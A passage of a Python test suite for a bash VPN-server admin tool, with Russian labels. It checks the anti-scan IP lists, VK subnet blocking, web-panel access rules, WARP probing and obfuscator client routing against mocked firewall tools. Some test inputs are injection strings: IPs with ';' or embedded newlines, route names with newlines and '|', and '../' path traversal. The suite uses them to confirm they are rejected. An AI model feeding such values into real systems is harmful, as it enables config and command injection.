# IPv6-адрес SSH-сессии внутри списка — в исключения насовсем
for ip in ("77.0.6.6", "8.8.4.4", "::ffff:77.0.6.8", "2a0c:a9c7:157::5", "77.0.6.7;x", "77.0.6.9\n1.1.1.1", "77.0.6"):
    api("antiscan", "update", env=dict(ASENV, AWG_CLIENT_IP=ip))
allow = open(os.path.join(ROOT, "var/lib/awg2/antiscan/allow")).read()
rows = [x.split()[0] for x in allow.splitlines() if x.strip()]
chk("адрес клиента панели внутри списка — в исключения (IPv4, IPv4 в IPv6, IPv6); снаружи и мусор — нет",
    "77.0.6.6 # панель" in allow and "77.0.6.8 # панель" in allow and "2a0c:a9c7:157::5 # панель" in allow
    and not any(x.startswith(("8.8.4.4", "77.0.6.7", "77.0.6.9", "1.1.1.1")) or x == "77.0.6" for x in rows)
    and "77.0.6.6/32 nomatch" in (ipset_set("awg2-antiscan") or []), allow)
api("antiscan", "update", env=dict(ASENV, AWG_CLIENT_IP="77.0.6.6"))
chk("повторное включение с того же адреса — без дубля", open(os.path.join(ROOT, "var/lib/awg2/antiscan/allow")).read()
    .count("77.0.6.6 ") == 1, allow)
api("antiscan", "update", env=dict(ASENV, SSH_CONNECTION="2a0c:a9c7:157::9 5000 2001:db8::1 22"))
allow = open(os.path.join(ROOT, "var/lib/awg2/antiscan/allow")).read()
chk("IPv6-адрес SSH-сессии внутри списка — в исключения насовсем",
    "2a0c:a9c7:157::9 # SSH" in allow and "2a0c:a9c7:157::9/128 nomatch" in (ipset_set("awg2-antiscan6") or []), allow)

r = api("antiscan", "allow", env=ASENV)
chk("allow без аргументов — ответ JSON с отказом, а не обрыв без ответа (set -u)", r.get("ok") is False and r.get("_rc") != 0, r)

r = api("antiscan", "lists", "scan,skipa", env=ASENV)
v4 = ipset_set("awg2-antiscan") or []
r2 = api("antiscan", "lists", "foo", env=ASENV)
chk("списки: без госсетей — их подсетей в наборе нет; неизвестный список — отказ",
    r.get("ok") and "31.1.0.0/16" in v4 and "77.0.5.0/24" not in v4 and not r2.get("ok"), [r, r2])

heal = os.path.join(ROOT, "var/lib/awg2/antiscan/heal")
with open(heal, "a"):
    pass
os.utime(heal, (time.time() - 4 * 3600,) * 2)
reset_calls()
rc, out, _ = bash(ASPRE + "antiscan_watchdog")
chk("сторож: таймер молчал больше трёх часов — перезапуск",
    "systemctl start --no-block awg2-antiscan-update.service" in calls(), calls())

# Проход таймера уже увидел ON=1 и качает списки, а в это время выключают:
# выключение ждёт его замок, проход перед применением видит ON=0 — правило не возвращается
timer = subprocess.Popen(["bash", "-c", PRELUDE + ASPRE + 'FAKE_CURL_SLEEP=1 bash "$ANTISCAN_SCRIPT" update'],
                         env=dict(ENV, **ASENV), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(0.7)
r = api("antiscan", "off", env=ASENV)
timer.wait(60)
chk("выключение во время прохода таймера: правило и наборы не возвращаются",
    r.get("ok") and not any("awg2-antiscan" in x for x in ipt(4) + ipt(6))
    and ipset_set("awg2-antiscan") is None and ipset_set("awg2-antiscan6") is None, [r, ipt(4), ipt(6)])
r = api("antiscan", "off", env=ASENV)
chk("api antiscan off: правила сняты, наборы удалены, службы убраны",
    r.get("ok") and not any("awg2-antiscan" in x for x in ipt(4) + ipt(6))
    and ipset_set("awg2-antiscan") is None and ipset_set("awg2-antiscan6") is None, [r, ipt(4), ipt(6)])
rc, out, _ = bash(ASPRE + 'bash "$ANTISCAN_SCRIPT" apply; echo "rc=$?"; ls "$IPSET_DIR/sets"')
chk("выключен — служба при загрузке ничего не ставит", out.split() == ["rc=0"], out)
rc, out, _ = bash(ASPRE + 'antiscan_remove; ls "$ANTISCAN_DIR" "$ANTISCAN_SCRIPT" 2>&1')
chk("удаление вместе со скриптом: каталог и скрипт убраны", out.count("No such file") == 2, out)

print("\n── WARP: проверка для уведомлений бота ──")
with open(LINKS, "w") as f:
    f.write("awg0\nwarp0\n")
open(HC_PING, "w").close()
HCENV = {"PATH": HCBIN + ":" + ENV["PATH"], "HC_PING": HC_PING, "HC_RT": HC_RT}
r = api("warp", "probe", env=HCENV)
d = r.get("data") or {}
chk("warp probe: без health-check бот проверяет сам — WARP отвечает",
    r.get("ok") and d.get("up") is True and d.get("health") is False and d.get("ok") is True and d.get("failover") is False, r)
os.remove(HC_PING)
d = api("warp", "probe", env=HCENV).get("data") or {}
chk("warp probe: не отвечает — ok: false", d.get("ok") is False, d)
with open(ACTIVE, "a") as f:
    f.write("awg-warp-healthcheck.timer\n")
d = api("warp", "probe", env=HCENV).get("data") or {}
chk("warp probe: с health-check — без пинга, проверяет он", d.get("health") is True and "ok" not in d, d)
d = api("warp", "probe", "ping", env=HCENV).get("data") or {}
chk("warp probe ping: бот ждёт конца сбоя — пингует и с health-check", d.get("health") is True and d.get("ok") is False, d)
with open(ACTIVE) as f:
    act = f.read().replace("awg-warp-healthcheck.timer\n", "")
with open(ACTIVE, "w") as f:
    f.write(act)
with open(LINKS, "w") as f:
    f.write("awg0\n")
rc, out, _ = bash("_api_readonly warp probe && echo RO")
chk("warp probe — чтение без очереди api", "RO" in out, out)

print("\n── VK и Max мимо VPN ──")


def vk_list(n, width=22):
    return ("# VK\n" + "".join(f"95.{i}.0.0/{width}\n" for i in range(n))
            + "10.0.0.0/8\n1.0.0.0/4\nfoo bar\n2a00:bdc0::/29\nfe80::/10\n")


def mangle(fam=4):
    try:
        return open(f"{IPT_RULES}.{'iptables' if fam == 4 else 'ip6tables'}.mangle").read().split("\n")[:-1]
    except OSError:
        return []


VKRULE = lambda st: (f"PREROUTING -m set --match-set {st} dst -m addrtype ! --dst-type LOCAL "
                     "-m comment --comment awg2-vkblock -j DROP")
VKDIR = os.path.join(ROOT, "var/lib/awg2/vkblock")
with open(os.path.join(ASLISTS, "blacklist-vk.txt"), "w") as f:
    f.write(vk_list(60))
in4, in6 = ipt(4), ipt(6)
reset_calls()
r = api("vkblock", "on", env=ASENV)
v4 = ipset_set("awg2-vk") or []
chk("api vkblock on: список скачан, частные и слишком широкие отброшены, DROP в mangle PREROUTING мимо адресов сервера",
    r.get("ok") and len(v4) == 60 and "95.0.0.0/22" in v4 and not any(x.startswith(("10.", "1.0.")) for x in v4)
    and mangle(4) == [VKRULE("awg2-vk")], [r, mangle(4), v4[:3]])
chk("IPv6 — свой набор и правило в ip6tables mangle",
    ipset_set("awg2-vk6") == ["2a00:bdc0::/29"] and mangle(6) == [VKRULE("awg2-vk6")], [ipset_set("awg2-vk6"), mangle(6)])
chk("INPUT и FORWARD не тронуты — антисканер и правила сервера отдельно", ipt(4) == in4 and ipt(6) == in6, ipt(4))
units = os.listdir(os.path.join(ROOT, "units"))
svc = open(os.path.join(ROOT, "units", "awg2-vkblock.service")).read()
chk("служба при загрузке — раньше UFW и netfilter-persistent; таймер раз в час",
    {"awg2-vkblock.service", "awg2-vkblock-update.service", "awg2-vkblock-update.timer"} <= set(units)
    and "Before=network-pre.target ufw.service netfilter-persistent.service" in svc
    and "systemctl enable --now awg2-vkblock-update.timer" in calls()
    and "curl https://raw.githubusercontent.com/C24Be/AS_Network_List/main/blacklists/blacklist-vk.txt" in calls(), units)

with open(f"{IPT_RULES}.iptables.mangle.cnt", "w") as f:
    f.write("17")
r = api("vkblock", "status", env=ASENV)
d = r.get("data") or {}
chk("api vkblock status: включено, правило на месте, подсети, счётчик отбитых, время списка",
    r.get("ok") and d.get("enabled") and d.get("active") and d.get("v4") == 60 and d.get("v6") == 1
    and d.get("dropped") == 17 and d.get("updated", 0) > 0 and d.get("error") == "", d)
rc, out, _ = bash(ASPRE + "_api_readonly vkblock status && echo RO")
chk("vkblock status — чтение без очереди api", "RO" in out, out)

with open(os.path.join(ASLISTS, "blacklist-vk.txt"), "w") as f:
    f.write(vk_list(10))
r = api("vkblock", "update", env=ASENV)
d = api("vkblock", "status", env=ASENV).get("data") or {}
chk("оборванный список прежний не заменяет: ошибка видна, набор прежний",
    "записей" in (d.get("error") or "") and d.get("v4") == 60 and len(ipset_set("awg2-vk") or []) == 60, [r, d])
with open(os.path.join(ASLISTS, "blacklist-vk.txt"), "w") as f:
    f.write(vk_list(60, 12))
api("vkblock", "update", env=ASENV)
d = api("vkblock", "status", env=ASENV).get("data") or {}
chk("слишком широкий охват (подменённый список) — не принят",
    "охват" in (d.get("error") or "") and "95.0.0.0/22" in (ipset_set("awg2-vk") or []), d)
with open(os.path.join(ASLISTS, "blacklist-vk.txt"), "w") as f:
    f.write(vk_list(70))
api("vkblock", "update", env=ASENV)
d = api("vkblock", "status", env=ASENV).get("data") or {}
chk("исправный список: ошибка ушла, набор обновлён", d.get("error") == "" and d.get("v4") == 70, d)

open(f"{IPT_RULES}.iptables.mangle", "w").close()
reset_calls()
rc, out, _ = bash(ASPRE + 'vkblock_rules_ok || echo GONE; bash "$VKBLOCK_SCRIPT" heal; echo "rc=$?"')
chk("правило сбросили — таймер возвращает его без скачивания",
    "GONE" in out and "rc=0" in out and mangle(4) == [VKRULE("awg2-vk")] and "curl" not in calls(), [out, mangle(4)])
reset_calls()
rc, out, _ = bash(ASPRE + 'bash "$VKBLOCK_SCRIPT" heal; echo "rc=$?"')
chk("правило на месте, список свежий — таймер только проверяет: без скачивания и без изменений",
    "rc=0" in out and calls() and not any(c.startswith("curl") or " -I " in c or "restore" in c or "swap" in c
                                          for c in calls()), calls())
rc, out, _ = bash(ASPRE + 'sed -i "s/^UPDATED=.*/UPDATED=1/" "$VKBLOCK_CONF"; bash "$VKBLOCK_SCRIPT" heal; '
                  'grep -c "^curl" "$CALLS"')
chk("список старше суток — таймер обновляет", out.strip().endswith("1"), out)

heal = os.path.join(VKDIR, "heal")
os.utime(heal, (time.time() - 4 * 3600,) * 2)
reset_calls()
bash(ASPRE + "vkblock_watchdog")
chk("сторож: таймер молчал больше трёх часов — перезапуск",
    "systemctl start --no-block awg2-vkblock-update.service" in calls(), calls())

r = api("antiscan", "status", env=ASENV)
chk("антисканер выключен — «VK и Max» от него не зависит",
    r.get("ok") and not (r.get("data") or {}).get("enabled") and mangle(4) == [VKRULE("awg2-vk")], r)

r = api("vkblock", "off", env=ASENV)
chk("api vkblock off: правила сняты, наборы удалены",
    r.get("ok") and mangle(4) == [] and mangle(6) == [] and ipset_set("awg2-vk") is None and ipset_set("awg2-vk6") is None,
    [r, mangle(4), mangle(6)])
d = api("vkblock", "status", env=ASENV).get("data") or {}
chk("выключено — статус и счётчик", d.get("enabled") is False and d.get("active") is False and d.get("dropped") == 0, d)
rc, out, _ = bash(ASPRE + 'bash "$VKBLOCK_SCRIPT" apply; echo "rc=$?"; ls "$IPSET_DIR/sets"')
chk("выключено — служба при загрузке ничего не ставит", out.split() == ["rc=0"] and mangle(4) == [], out)
r = api("vkblock", "update", env=ASENV)
chk("обновление списка при выключенном — отказ", r.get("ok") is False, r)

with open(os.path.join(ASLISTS, "blacklist-vk.txt"), "w") as f:
    f.write(vk_list(5))
os.remove(os.path.join(VKDIR, "vk.list"))
r = api("vkblock", "on", env=ASENV)
d = api("vkblock", "status", env=ASENV).get("data") or {}
chk("включение без годного списка — отказ, выключено, правил нет",
    r.get("ok") is False and "не получен: в ответе 6 записей — список не принят" in (r.get("error") or "") + (r.get("log") or "")
    and d.get("enabled") is False and mangle(4) == [], [r, d])
rc, out, _ = bash(ASPRE + 'vkblock_remove; ls "$VKBLOCK_DIR" "$VKBLOCK_SCRIPT" 2>&1')
chk("удаление вместе со скриптом: каталог и скрипт убраны", out.count("No such file") == 2, out)

print("\n── Веб-панель: доступ по адресам и только через VPN ──")
WFW = os.path.join(TMP, "awg2-web-fw")
WNETS = os.path.join(TMP, "awg-web", "access.nets")
WACC = ASPRE + WEBAPI + f'WEB_FW_SCRIPT="{WFW}"; WEB_NETS_FILE="{WNETS}"; need_cmds() {{ return 0; }}; '
for fam in ("iptables", "ip6tables"):
    open(f"{IPT_RULES}.{fam}", "w").close()
wport = dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)["WEB_PORT"]
rc, out, _ = bash(WACC + 'server_net; wgobf_get NET')
VPN = out.split()
WRULE = lambda port, st: (f"INPUT ! -i lo -p tcp --dport {port} -m conntrack --ctstate NEW -m set ! --match-set {st} src "
                          "-m comment --comment awg2-webacl -j DROP")
webacl = lambda fam=4: [x for x in ipt(fam) if "awg2-webacl" in x]
wconf = lambda: dict(ln.split("=", 1) for ln in open(WEBC).read().split("\n") if "=" in ln)
chk("для проверки есть подсети своего VPN (awg0 и обфускатор)", len(VPN) == 2, VPN)
rc, out, err = bash(WACC + 'web_access_set ip 1.2.3.4 999.1.1.1 0.0.0.0/0')
chk("не адрес и слишком широкая подсеть — отказ, режим не меняется",
    rc != 0 and "999.1.1.1" in out + err and "0.0.0.0/0" in out + err and "WEB_ACCESS" not in wconf(), [out, err])
# «*» в списке адресов — не маска файлов текущего каталога: в ответе то, что ввели, а не имена файлов
os.makedirs(os.path.join(TMP, "globdir"), exist_ok=True)
open(os.path.join(TMP, "globdir", "zz-file-1"), "w").close()
rc, out, err = bash(WACC + f'cd "{TMP}/globdir"; web_access_set ip "*" "1.2.3.?"')
chk("в списке адресов «*» и «?» не раскрываются в имена файлов; отказ называет введённое",
    rc != 0 and "zz-file-1" not in out + err and "*, 1.2.3.?" in out + err and "WEB_ACCESS" not in wconf(), [out, err])
rc, out, err = bash(WACC + 'web_access_set ip "1.2.3.4, 5.6.7.8/16" 2A02:6B8::/32 1.2.3.4')
c = wconf()
chk("по адресам: список нормализован (подсеть, регистр IPv6, без дублей), в конфиге режим ip",
    rc == 0 and c.get("WEB_ACCESS") == "ip" and c.get("WEB_ALLOW") == "1.2.3.4/32,5.6.0.0/16,2a02:6b8::/32", [out, err, c])
chk("список для самой панели: адреса и свой VPN; права 600",
    open(WNETS).read().split() == ["1.2.3.4/32", "5.6.0.0/16", "2a02:6b8::/32"] + VPN
    and os.stat(WNETS).st_mode & 0o777 == 0o600, open(WNETS).read())
chk("набор IPv4 — адреса и VPN, IPv6 — свой; правило DROP первым в INPUT на порт панели (и для IPv6)",
    sorted(ipset_set("awg2-web") or []) == sorted(["1.2.3.4/32", "5.6.0.0/16"] + VPN)
    and ipset_set("awg2-web6") == ["2a02:6b8::/32"] and ipt(4)[:1] == [WRULE(wport, "awg2-web")]
    and ipt(6)[:1] == [WRULE(wport, "awg2-web6")], [ipset_set("awg2-web"), ipset_set("awg2-web6"), ipt(4), ipt(6)])
chk("скрипт правила для загрузки и самой панели сгенерирован", os.path.isfile(WFW)
    and subprocess.run(["bash", "-n", WFW]).returncode == 0, WFW)
fwu = open(os.path.join(ROOT, "units", "awg2-web-fw.service")).read()
chk("служба правила при загрузке — раньше UFW и netfilter-persistent (сохранённые правила найдут набор)",
    "DefaultDependencies=no" in fwu and "Before=network-pre.target ufw.service netfilter-persistent.service" in fwu
    and f"ExecStart=-{WFW} apply" in fwu and "WantedBy=multi-user.target" in fwu, fwu)
# Антисканер: оба правила DROP — друг друга не двигают, его проверка «первый» проходит
rc, out, _ = bash(WACC + 'ipset create awg2-antiscan hash:net; _antiscan_rule_up iptables awg2-antiscan; '
                  'antiscan_rules_ok && echo AS-OK; web_fw_run apply; antiscan_rules_ok && echo AS-OK2; '
                  '_antiscan_rule_up iptables awg2-antiscan; antiscan_rules_ok && echo AS-OK3')
chk("с антисканером: его правило «первое» и до, и после нашего (наш DROP он допускает выше себя); по одному правилу",
    out.split() == ["AS-OK", "AS-OK2", "AS-OK3"] and len(webacl()) == 1
    and sum("awg2-antiscan" in x for x in ipt(4)) == 1, [out, ipt(4)])
rc, out, _ = bash(WACC + f'bash "{WFW}" check; echo "rc=$?"; iptables -D {WRULE(wport, "awg2-web")}; '
                  f'bash "{WFW}" check; echo "rc=$?"; bash "{WFW}" apply; bash "{WFW}" check; echo "rc=$?"')
chk("проверка: на месте — 0; правило сняли — 1, apply возвращает", out.split() == ["rc=0", "rc=1", "rc=0"]
    and len(webacl()) == 1, [out, ipt(4)])
rc, out, _ = bash(WACC + f'echo "NET=10.99.0.0/24" > "{TMP}/wgobf-state-x"; WGOBF_STATE="{TMP}/wgobf-state-x"; '
                  f'_web_fw_emit; bash "{WFW}" check; echo "rc=$?"; _web_fw_emit')
chk("сменилась подсеть VPN (обфускатор поставили заново) — проверка просит обновить список", out.split() == ["rc=1"], out)
rc, out, _ = bash(WACC + 'web_conf_set WEB_PORT 40123; web_fw_run apply; web_conf_set WEB_PORT ' + wport + '; '
                  'iptables -S INPUT | grep -c awg2-webacl')
chk("смена порта — правило на новом порту, старое снято", out.split() == ["1"] and webacl()[0] == WRULE(40123, "awg2-web"),
    [out, ipt(4)])
bash(WACC + 'web_fw_run apply')
rc, out, err = bash(WACC + 'AWG_CLIENT_IP=203.0.113.9 web_access_set ip 198.51.100.0/24')
rc2, out2, err2 = bash(WACC + 'AWG_CLIENT_IP=198.51.100.7 web_access_set ip 198.51.100.0/24')
chk("из панели: свой адрес не в списке — отказ (панель закрылась бы сама); в списке — можно",
    rc != 0 and "203.0.113.9" in out + err and rc2 == 0 and wconf().get("WEB_ALLOW") == "198.51.100.0/24", [out, err, out2, err2])
vhost = VPN[0].rsplit(".", 1)[0] + ".5"
rc, out, err = bash(WACC + 'AWG_CLIENT_IP=203.0.113.9 web_access_set vpn')
rc2, out2, err2 = bash(WACC + f'AWG_CLIENT_IP={vhost} web_access_set vpn')
chk("только через VPN: зашли не через VPN — отказ с адресом панели изнутри VPN; через VPN — можно",
    rc != 0 and "не через VPN" in out + err and rc2 == 0 and wconf().get("WEB_ACCESS") == "vpn"
    and sorted(ipset_set("awg2-web") or []) == sorted(VPN) and ipset_set("awg2-web6") == []
    and wconf().get("WEB_ALLOW") == "198.51.100.0/24", [out, err, out2, err2, ipset_set("awg2-web")])
rc, out, err = bash(WACC + 'AWG_CLIENT_IP=127.0.0.1 web_access_set vpn && AWG_CLIENT_IP=::1 web_access_set vpn')
chk("с самого сервера (127.0.0.1, ::1) — можно любой режим: так панель открывается всегда", rc == 0, [out, err])
WGC = os.path.join(TMP, "wgobf0-only.conf")
with open(WGC, "w") as f:
    f.write("[Interface]\nAddress = 10.77.0.1/24\nPrivateKey = X\n")
rc, out, _ = bash(WACC + f'SERVER_CONF="{TMP}/no-awg0.conf"; WGOBF_WG_CONF="{WGC}"; web_vpn_url')
chk("адрес изнутри VPN без AWG — адрес wgobf0", out.strip() == f"https://10.77.0.1:{wport}/{wconf()['WEB_PATH']}/", out)
rc, out, _ = bash(WACC + "api_main web status")
st = json.loads(out)["data"]
chk("api web status: доступ, список (хранится и в режиме VPN), подсети VPN, адрес из VPN",
    st.get("access") == "vpn" and st.get("allow") == ["198.51.100.0/24"] and st.get("vpn_nets") == VPN
    and st.get("vpn_url", "").startswith("https://" + VPN[0].rsplit(".", 1)[0] + ".1:" + wport + "/"), st)
rc, out, _ = bash(WACC + "api_main web access all")
chk("для всех: правила и наборы сняты, файл списка убран, список адресов сохранён",
    json.loads(out).get("ok") and not webacl(4) and not webacl(6) and ipset_set("awg2-web") is None
    and ipset_set("awg2-web6") is None and not os.path.exists(WNETS) and wconf().get("WEB_ALLOW") == "198.51.100.0/24",
    [out, ipt(4), ipt(6)])
# Скрипт сам по себе (загрузка, сама панель): без функций awg2
with open(WEBC, "a") as f:
    f.write("WEB_ACCESS=vpn\n")
rc, out, err = bash(ASPRE + f'bash "{WFW}" apply; echo "rc=$?"')
chk("скрипт без awg2 (ExecStartPre при загрузке): ставит правило по конфигу", out.split()[-1:] == ["rc=0"]
    and webacl()[:1] == [WRULE(wport, "awg2-web")], [out, err, ipt(4)])
rc, out, _ = bash(WACC + 'web_write_unit; cat "' + ROOT + '/units/awg-web.service"')
chk("юнит панели: правило ставится до старта (с «-»: не встало — панель всё равно стартует), путь скрипта панели",
    f"ExecStartPre=-{WFW} apply" in out and f"AWG_WEB_FW={WFW}" in out and f"AWG_WEB_NETS={WNETS}" in out, out)
rc, out, _ = bash(WACC + 'unset SSH_CONNECTION; web_access_menu; web_conf_get WEB_ACCESS; web_conf_get WEB_ALLOW',
                  stdin="2\n198.51.100.0/24, 192.0.2.7\n")
rc2, out2, _ = bash(WACC + 'web_access_menu; web_conf_get WEB_ACCESS; do_web_menu', stdin="1\n0\n")
chk("меню awg2: «Только с моих адресов» — список через запятую; «Для всех»; строка «Доступ» в меню панели",
    out.split()[-2:] == ["ip", "198.51.100.0/24,192.0.2.7/32"] and "Только через VPN" in out
    and "\nall\n" in out2 and any("a)" in ln and "Доступ" in ln and "для всех" in ln for ln in out2.splitlines()), [out[-600:], out2[-900:]])
rc, out, _ = bash(WACC + 'web_access_set vpn >/dev/null; command() { [[ "$*" == "-v ipset" ]] && return 1; builtin command "$@"; }; '
                  'web_fw_run check; echo "rc=$?"; echo 192.0.2.0/24 >> "$WEB_NETS_FILE"; web_fw_run check; echo "rc=$?"; '
                  'unset -f command; web_access_set all >/dev/null')
chk("без ipset проверка сверяет только список панели — не дёргает apply каждые 5 минут", out.split() == ["rc=0", "rc=1"], out)
rc, out, _ = bash(WACC + 'web_fw_run down; iptables -S INPUT | grep -c awg2-webacl; ls "$WEB_NETS_FILE" 2>&1 | grep -c "No such"')
chk("down — всё снято", out.split() == ["0", "1"], out)
# Apply из awg2 и из сторожа панели разом — по очереди (иначе два DROP): второй ждёт замка первого
bash(WACC + 'web_access_set vpn >/dev/null')
order = os.path.join(TMP, "webfw-order")
rc, out, _ = bash(WACC + f': > "{order}"; flock "$WEB_NETS_FILE.lock" -c \'sleep 1.5; echo released >> "{order}"\' & '
                  f'sleep 0.3; bash "{WFW}" apply; echo applied >> "{order}"; wait')
chk("правило панели: apply ждёт замка параллельного apply (скрипт панели и awg2 — один замок)",
    open(order).read().split() == ["released", "applied"] and len(webacl()) == 1, [open(order).read(), ipt(4)])
# Сменился VPN — список и правило панели сразу, не через 5 минут; последний VPN удалён при «только через VPN» —
# режим «по адресам» по сохранённому списку (иначе панель закрылась бы всем), списка нет — «для всех»
WOB = os.path.join(TMP, "wgobf-copy")
shutil.rmtree(WOB, ignore_errors=True)
os.makedirs(os.path.join(WOB, "etc"))
shutil.copy(os.path.join(ROOT, "etc/awg-wgobf/state"), os.path.join(WOB, "etc/state"))
open(os.path.join(WOB, "wgobf0.conf"), "w").write("[Interface]\nAddress = 10.77.0.1/24\n")
WOBPRE = (f'WGOBF_DIR="{WOB}/etc"; WGOBF_STATE="{WOB}/etc/state"; WGOBF_WG_CONF="{WOB}/wgobf0.conf"; '
          f'WGOBF_CLIENTS="{WOB}/clients"; WGOBF_LIB="{WOB}/lib"; WGOBF_BIN="{WOB}/lib/bin"; BACKUP_DIR="{WOB}/bak"; '
          '_wgobf_routes_clear() { :; }; ')
bash(WACC + 'web_access_set ip 198.51.100.0/24 >/dev/null')
rc, out, err = bash(WACC + WOBPRE + 'wgobf_remove quiet; web_conf_get WEB_ACCESS')
chk("обфускатор удалён (доступ по адресам) — его подсеть из списка панели и набора убрана сразу",
    out.split()[-1:] == ["ip"] and open(WNETS).read().split() == ["198.51.100.0/24", VPN[0]]
    and sorted(ipset_set("awg2-web") or []) == sorted(["198.51.100.0/24", VPN[0]]), [out, err, open(WNETS).read()])
SRV = os.path.join(TMP, "srv-copy")
shutil.rmtree(SRV, ignore_errors=True)
os.makedirs(SRV)
shutil.copy(os.path.join(ROOT, "etc/amnezia/amneziawg/awg0.conf"), os.path.join(SRV, "awg0.conf"))
SRVPRE = (f'SERVER_CONF="{SRV}/awg0.conf"; CLIENT_DIR="{SRV}/cl"; TRAFFIC_DB="{SRV}/t.json"; WARP_PEERS="{SRV}/w"; '
          f'XRAY_PEERS="{SRV}/x"; EXITS_PEERS="{SRV}/e"; EXPIRE_STATE_DIR="{SRV}/exp"; WGOBF_STATE="{WOB}/none"; '
          'auto_backup() { :; }; tunnels_panic_reset() { :; }; ')
bash(WACC + SRVPRE + 'web_access_set vpn >/dev/null')
rc, out, err = bash(WACC + SRVPRE + 'server_reset; web_conf_get WEB_ACCESS; web_conf_get WEB_ALLOW')
chk("сервер сброшен, других VPN нет, доступ «только через VPN» — режим тот же, снаружи закрыта, с предупреждением",
    out.split()[-2:] == ["vpn", "198.51.100.0/24"] and "снаружи она закрыта" in out
    and open(WNETS).read().split() == [] and ipset_set("awg2-web") == [] and len(webacl()) == 1,
    [out, err, open(WNETS).read()])
rc, out, err = bash(WACC + 'web_vpn_changed; web_conf_get WEB_ACCESS')
chk("VPN снова есть (новый сервер) — «только через VPN» открывается через него сам, без предупреждения",
    out.split()[-1:] == ["vpn"] and "закрыта" not in out and open(WNETS).read().split() == VPN
    and sorted(ipset_set("awg2-web") or []) == sorted(VPN) and len(webacl()) == 1, [out, err, open(WNETS).read()])
bash(WACC + 'web_conf_set WEB_ACCESS all; web_fw_run apply')

print("\n── WG + обфускатор: клиенты с трафиком ──")
os.makedirs(os.path.join(ROOT, "etc/awg-wgobf"), exist_ok=True)
os.makedirs(os.path.join(ROOT, "etc/wireguard"), exist_ok=True)
with open(os.path.join(ROOT, "etc/awg-wgobf/state"), "w") as f:
    f.write("PORT=41000\nENDPOINT=203.0.113.10\nMASKING=STUN\nKEY=k\nNET=10.66.66.0/24\nWG_PORT=51900\n")
with open(os.path.join(ROOT, "etc/wireguard/wgobf0.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = X\n\n[Peer]\n# client=wa\nPublicKey = WAPUB=\nAllowedIPs = 10.66.66.2/32\n\n"
            "[Peer]\n# client=wb\nPublicKey = WBPUB=\nAllowedIPs = 10.66.66.3/32\n")
with open(WG_DUMP, "w") as f:
    f.write(f"SRVPRIV=\tSRVPUB=\t51900\toff\nWAPUB=\t(none)\t127.0.0.1:40000\t10.66.66.2/32\t{int(time.time()) - 40}"
            "\t5000\t7000\t25\n")
r = api("wgobf", "clients")
rows = {x["name"]: x for x in r.get("data") or []}
chk("клиенты обфускатора: рукопожатие и трафик с запуска; у второго (нет в dump) — пусто, не цифры соседа",
    r.get("ok") and rows.get("wa", {}).get("rx") == 5000 and rows["wa"].get("tx") == 7000 and 30 <= rows["wa"].get("ago", -1) <= 120
    and rows.get("wb", {}).get("rx") == 0 and rows["wb"].get("ago") is None, r)
print("\n── WG + обфускатор: выход через WARP ──")
r = api("wgobf", "route", "all", "warp")
chk("выход через WARP без настроенного WARP — отказ с подсказкой", r.get("ok") is False and "WARP не настроен" in r.get("error", ""), r)
with open(os.path.join(ROOT, "etc/wireguard/warp0.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = P\nAddress = 172.16.0.2/32\n[Peer]\nPublicKey = Q\nEndpoint = 162.159.192.1:2408\n")
reset_calls()
r = api("wgobf", "route", "all", "warp")
wl = lambda: bash('cat "$WARP_PEERS.wgobf" 2>/dev/null')[1].split()
st = (api("wgobf", "status").get("data") or {})
rows = {x["name"]: x for x in api("wgobf", "clients").get("data") or []}
chk("все клиенты обфускатора — в WARP: список .wgobf, выход в status и clients, WARP выключен — подсказка",
    r.get("ok") and wl() == ["10.66.66.2", "10.66.66.3"] and st.get("route") == "warp" and st.get("warp") == "off"
    and rows.get("wa", {}).get("route") == "warp" and rows.get("wb", {}).get("route") == "warp"
    and "WARP сейчас выключен" in r.get("_err", "") + json.dumps(r, ensure_ascii=False), [r, wl(), st, rows])
r = api("wgobf", "route", "wb", "direct")
rows = {x["name"]: x for x in api("wgobf", "clients").get("data") or []}
chk("один клиент — напрямую: из списка WARP и его правила сняты", r.get("ok") and wl() == ["10.66.66.2"]
    and rows["wb"]["route"] == "direct" and "ip rule del from 10.66.66.3" in calls(), [r, wl()])
r = api("wgobf", "route", "nobody", "warp")
r2 = api("wgobf", "route", "wa", "tor")
r3 = api("wgobf", "route", "wa", "warp:x")
r4 = api("wgobf", "route", "wa", "xray:A\n10.66.66.9|B")
r5 = api("wgobf", "route", "wa", "exits:../x")
chk("нет клиента и неизвестный выход — отказ; перевод строки и чужие символы в выходе — тоже",
    all(x.get("ok") is False for x in (r, r2, r3, r4, r5)) and wl() == ["10.66.66.2"], [r, r2, r3, r4, r5, wl()])
rc, out, _ = bash('peers_all "$WARP_PEERS"; peers_sync "$WARP_PEERS"; : > "$WARP_PEERS"; cat "$WARP_PEERS.wgobf"')
chk("«все клиенты AWG» и синхронизация списка WARP клиентов обфускатора не трогают", out.split() == ["10.66.66.2"], out)
rc, out, _ = bash('_wgobf_sync() { :; }; wgobf_write_bundle() { :; }; wgobf_add_client wc >/dev/null 2>&1; cat "$WARP_PEERS.wgobf"; '
                  'wgobf_delete_client wa >/dev/null 2>&1; echo "--"; cat "$WARP_PEERS.wgobf"')
chk("новый клиент — туда же, куда все (WARP); удалённый — из списка", out.split() == ["10.66.66.2", "10.66.66.4", "--", "10.66.66.4"], out)
rc, out, _ = bash('_wgobf_routes_clear; [[ -e "$WARP_PEERS.wgobf" ]] && echo LEFT || echo GONE')
chk("удаление или новая установка обфускатора — список выходов прежних клиентов убран", out.strip() == "GONE", out)
os.remove(os.path.join(ROOT, "etc/wireguard/warp0.conf"))
with open(os.path.join(ROOT, "etc/wireguard/wgobf0.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = X\n\n[Peer]\n# client=wa\nPublicKey = WAPUB=\nAllowedIPs = 10.66.66.2/32\n\n"
            "[Peer]\n# client=wb\nPublicKey = WBPUB=\nAllowedIPs = 10.66.66.3/32\n")

print("\n── WG + обфускатор: AppArmor wg-quick (Ubuntu 25.10+) ──")
with open(os.path.join(BIN, "apparmor_parser"), "w") as f:
    f.write('#!/usr/bin/env bash\necho "apparmor_parser $*" >> "$CALLS"\nexit 0\n')
os.chmod(os.path.join(BIN, "apparmor_parser"), 0o755)
AA = os.path.join(ROOT, "etc/apparmor.d")
AAL = os.path.join(AA, "local/wg-quick")
reset_calls()
